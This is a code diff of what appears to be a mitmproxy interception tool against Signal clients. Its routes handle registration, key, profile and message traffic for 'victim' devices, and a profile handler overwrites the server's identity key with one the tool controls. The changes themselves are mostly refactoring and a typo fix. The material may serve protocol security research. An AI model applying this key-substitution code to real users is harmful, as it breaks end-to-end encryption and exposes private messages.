@@ -171,7 +171,7 @@ def _v1_registration_resp(flow: HTTPFlow):
         pni=resp["pni"],
         is_victim=True
     )
-    
+
     device = Device.insert(
         aci=resp["uuid"],
         pni=resp["pni"],
@@ -268,7 +268,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     ip_address = flow.client_conn.address[0]
 
     logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
-    identity, uuid = identifier.split(":")
+    identity, uuid = utils.strip_uuid_and_id(identifier)
 
     bob_identity_key_public = b64decode(resp["identityKey"])
 
@@ -425,7 +425,10 @@ def _v1_ws_versioned_profile(flow, identifier, version):
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
 
-    logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")
+    try:
+        logging.warning(f"{registration_info[ip_address].aci_data.iden_key}")
+    except KeyError:
+        logging.exception(f"{registration_info}")
 
     resp["identityKey"] = registration_info[ip_address].aci_data.iden_key
     flow.response.content = json.dumps(resp).encode()
@@ -435,7 +438,7 @@ def _v1_ws_versioned_profile(flow, identifier, version):
 def _v1_ws_profile(flow, identifier):
     logging.info(f"{identifier}")
     try:
-        uuid_type, uuid = re.search(r"(PNI|ACI):([a-f0-9-]+)", identifier).groups()
+        uuid_type, uuid = utils.strip_uuid_and_id(identifier)
     except AttributeError:
         logging.exception(f"Invalid identifier {identifier}")
         return
@@ -465,7 +468,7 @@ def _v1_ws_profile(flow, identifier):
     return flow.response.content
 
 
-def _v2_ws_message(flow, identifier):
+def _v1_ws_message(flow, identifier):
     logging.info(f"message: {identifier}")
     logging.info(f"message: {flow.request.content}")
 
@@ -474,7 +477,10 @@ def _v2_ws_message(flow, identifier):
 
     logging.info(f"ws message content: {resp}")
 
-    destintion_user = resp["destination"]
+    destination_user = resp["destination"]
+
+    identifier, destination = utils.strip_uuid_and_id(destination_user)
+
     for msg in resp["messages"]:
         if msg["destinationDeviceId"] != 1:
             logging.error("Secondary devices are not supported as the developer was not paid enough. C.f. my Twint ;)")
@@ -538,7 +544,7 @@ ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVe
                   None)
 
 ws_req = Router()
-ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v2_ws_message,
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message,
                  None)
 
 logging.warning(f"ROUTES (REQ): {ws_req.routes}")
